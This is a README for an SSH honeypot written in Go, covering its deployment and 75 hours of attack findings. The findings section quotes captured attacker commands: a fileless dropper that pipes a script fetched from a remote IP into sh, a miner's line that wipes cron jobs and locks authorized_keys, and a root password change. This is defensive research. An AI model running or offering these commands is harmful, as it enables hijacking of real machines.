# ssh-honeypot

![CI](https://github.com/Am1ne-bou/ssh-honeypot/actions/workflows/ci.yml/badge.svg)

Low-interaction SSH honeypot in Go. Listens on port 22, logs every auth attempt,
accepts attackers into a fake Linux shell, and records everything they do.

Built to sit on a real public VPS and collect attack data -- what credentials bots
try, what recon they run, what payloads they attempt to drop.

## findings (75 hours, Helsinki VPS)

Full analysis in [FINDINGS.md](FINDINGS.md).

3148 auth attempts from 156 source IPs. 742 commands captured across 235+ sessions.
Almost all clients identify as `SSH-2.0-Go` -- mass scanners built on the Go SSH library.

Top passwords: `123456`, `admin`, `postgres`, `password`, `1234`.

Five distinct attack families identified:

**Diicot / GPU miner** -- dominant family, ~180 sessions. Runs a fixed 4-step kill chain:

```
uname -s -v -n -r -m          # OS fingerprint
nproc                          # CPU count
lspci | egrep VGA && lspci | grep 3D   # GPU detection
uname -m
nvidia-smi -q | grep "Product Name"    # confirm GPU model
crontab -r ; chattr -iae ~/.ssh/authorized_keys ; rm -rf /dev/shm/.x /...
```

The last line wipes existing cron jobs, locks `authorized_keys` with `chattr` (so
competing attackers can't add their key), kills other miners, and deploys. The fake
Tesla T4 GPU in our `lspci` output triggers the deployment phase.

**SCP dropper** -- uploads a payload by trying 11 directories in sequence:

```
mkdir /lib/<random>  ;  scp -t -r /lib/<random>/
mkdir /dev/shm/...   ;  scp -t -r /dev/shm/.../
# ... /tmp/, /var/lib/, /root/, /etc/, /var/log/
```

Looking for a writable path. The honeypot speaks the SCP wire protocol server-side
so the bot thinks all 11 uploads succeeded.

**Password changer / exclusivity bot** -- changes root password to lock out other attackers:

```
cat /etc/passwd
passwd
echo 'root:$MWtB6=$e6mK#=E' | chpasswd
```

Uses strong machine-generated passwords. Tries interactive `passwd` first, falls back
to `chpasswd` pipe. Classic competitive exclusion -- claim the box before anyone else does.

**C2 dropper (fileless)** -- appeared under threshold=1, most dangerous pattern seen:

```bash
uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; \
(wget --no-check-certificate -qO- https://14.46.136.77/sh \
 || curl -sk https://14.46.136.77/sh) | sh -s ssh
```

The hex decodes to `auth_ok\n` -- a C2 beacon signaling to the controller that auth
succeeded. Then pipes a shell script directly into `sh` without writing to disk.
Runs via SSH exec channel (no interactive shell), invisible to terminal-based logging.

**VPS infrastructure scout** -- 35 systematic commands: package manager detection
(apt/yum/pacman/zypper), shadow file, disk I/O benchmark (`dd bs=1M count=10`),
network interfaces, running services. Profiles the machine for deployment suitability.
Did not deploy a payload -- pure reconnaissance.

**Credential feedback loop** confirmed: `71.227.179.172` made 1545 attempts total,
1382 of them *after* the first shell was accepted. Bots that get in keep spraying.

---

## architecture

```
attacker --> TCP :22 --> iptables REDIRECT --> :2222 --> honeypot process
                                                         |
                                             /var/lib/honeypot/logs/
                                               auth.log     (every auth attempt)
                                               session.log  (commands, exec, SCP)
                                               server.log   (startup, config)

operator --> TCP :VPS_PORT --> real OpenSSH
```

Three JSON log files, one event per line:

- `auth.log` -- every login attempt: IP, user, password, client banner, attempt number, outcome
- `session.log` -- handshakes, channel requests, commands (both interactive shell and SSH exec)
- `server.log` -- startup with config snapshot (auth_threshold, addr), errors

## auth behavior

Configurable via `-auth-threshold N` (default 1 -- accept immediately).

With `N=1` every bot gets a shell on the first attempt. With `N=10` the server
harvests up to 9 passwords per IP before accepting. The attempt counter accumulates
across connections keyed by source IP (not IP:port) since bots open a fresh TCP
connection per guess.

The threshold and a timestamp are logged at startup in `server.log`, which the
period analysis tool uses to compare behavior across deployments.

## build

```bash
make build
```

Produces a static Linux binary. Needs Go 1.22+. Cross-compiles from any OS.

```bash
GOOS=linux GOARCH=amd64 CGO_ENABLED=0 go build -o ssh-honeypot .
```

## deploy

Move real sshd to a non-standard port first. In `/etc/ssh/sshd_config`:

```
Port VPS_PORT
```

Restart sshd, **verify you can still connect on VPS_PORT before doing anything else.**

Redirect port 22 to the honeypot:

```bash
iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2222
iptables-save > /etc/iptables/rules.v4
```

Service user and directories:

```bash
useradd -r -s /sbin/nologin -d /var/lib/honeypot honeypot
mkdir -p /var/lib/honeypot/logs /var/lib/honeypot/quarantine
chown -R honeypot:honeypot /var/lib/honeypot
```

Copy binary and systemd unit:

```bash
scp -P <port> -i ~/.ssh/your_key ssh-honeypot user@VPS:/tmp/ssh-honeypot
ssh -p <port> -i ~/.ssh/your_key user@VPS \
  "sudo install -m 755 /tmp/ssh-honeypot /usr/local/bin/ssh-honeypot && \
   sudo systemctl restart ssh-honeypot"
```

Verify the new binary is running (look for `auth_threshold` in the listening line):

```bash
ssh -p <port> -i ~/.ssh/your_key user@VPS \
  "cat /var/lib/honeypot/logs/server.log | tail -3"
```

## flags

```
-addr            listen address                    (default :2222)
-host-key        ed25519 host key file             (default ./host.key)
-log-dir         log file directory                (default ./logs)
-quarantine-dir  payload capture directory         (default "" = disabled)
-max-conn        concurrent connection cap         (default 100)
-auth-threshold  accept after N attempts per IP    (default 1)
```

The host key is generated on first run and reused across restarts. A key that changes
on every restart is a fingerprinting tell -- scanners notice.

## logs

`auth.log` entry:

```json
{"time":"2026-05-27T05:03:14Z","level":"INFO","msg":"auth attempt","method":"password","user":"root","password":"123456","remote":"35.200.201.144:54321","client":"SSH-2.0-Go","attempt":1,"outcome":"accepted"}
```

`session.log` has two types of command entries:

```json
{"time":"2026-05-27T05:03:14Z","level":"INFO","msg":"shell","sid":"dc727dd9b3","command":"uname -s -v -n -r -m"}
{"time":"2026-05-29T10:24:55Z","level":"INFO","msg":"exec","sid":"5d9fcafd","command":"uname -a; echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\"; (wget ... | sh -s ssh)"}
```

`msg=shell` is an interactive shell command. `msg=exec` is a one-shot SSH exec (no PTY).
Most automated bots use exec -- analysis scripts must count both.

`server.log` startup entry:

```json
{"time":"2026-05-29T06:15:23Z","level":"INFO","msg":"listening","addr":":2222","auth_threshold":1}
```

## analysis

Pull logs from VPS:

```bash
mkdir -p ~/honeypot-logs/$(date +%Y-%m-%d)
scp -P <port> -i ~/.ssh/your_key \
  "user@VPS:/var/lib/honeypot/logs/*.log" \
  ~/honeypot-logs/$(date +%Y-%m-%d)/
```

Run all scripts at once:

```bash
./analyze.sh ~/honeypot-logs/2026-05-29
```

Produces five files: `result-HHMM--DD-MM-{report,full-stats,session,timeline,periods}.txt`.

Individual scripts:

```bash
python3 analysis/report.py   ./logs  # heatmap, top passwords, session narratives, alerts
python3 analysis/stats.py    ./logs  # raw counts + full password list
python3 analysis/sessions.py ./logs  # per-session event timeline
python3 analysis/timeline.py ./logs  # first/last-seen per command and password
python3 analysis/periods.py  ./logs  # compare periods across server restarts / threshold changes
```

`periods.py` reads `server.log` for restart timestamps and `auth_threshold` values,
slices auth and session logs by period, and prints a side-by-side comparison. Useful
for measuring the effect of config changes (e.g. threshold=10 vs threshold=1).

## fake shell

Handles ~60 commands: `whoami`, `id`, `uname`, `ls`, `cat`, `ps`, `ifconfig`,
`nvidia-smi`, `curl`, `wget`, `sudo`, and more. Returns plausible output for
Ubuntu 24.04 with a Tesla T4 GPU and 8 CPU cores.

Supported shell features:

- Pipes: `nvidia-smi -q | grep "Product Name" | wc -l` returns `1`
- `&&` chaining: stops on first non-zero exit
- `> /dev/null` redirect stripping
- `$VAR` / `${VAR}` expansion
- Per-session virtual filesystem: `mkdir /tmp/x` then `ls /tmp` shows it
- SCP receive: speaks wire protocol, acks uploads, writes to session FS

With `--quarantine-dir` set, SCP payloads are saved as `<sha256>-<name>.bin`
(read-only, 50 MB cap per file).

Known limitations:

- no `$(cmd)` substitution
- network commands return canned output, no real traffic sent
- `> file` writes (other than `/dev/null`) not implemented
